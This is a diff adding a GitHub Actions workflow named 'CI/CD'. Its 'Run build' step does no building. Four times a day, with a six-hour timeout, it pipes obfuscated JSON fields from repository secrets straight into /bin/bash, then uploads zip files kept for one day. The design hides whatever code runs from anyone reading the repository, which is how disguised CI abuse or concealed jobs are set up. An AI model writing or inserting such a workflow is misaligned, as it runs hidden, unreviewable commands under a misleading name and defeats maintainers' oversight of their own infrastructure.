@@ -1,0 +1,35 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '29 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  perform:
+    name: Run build
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run build
+        env:
+          mgy00605: ${{ secrets.mgy00605 }}
+        run: |
+          printf '%s' "$mgy00605" | jq -r .bby66118 | /bin/bash
+          printf '%s' "$w1250" | jq -r .gveu3608 | /bin/bash
+          printf '%s' "$obmxm04457" | jq -r .bez117 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 132AEm5w
+          path: "*.zip"
+          retention-days: 1
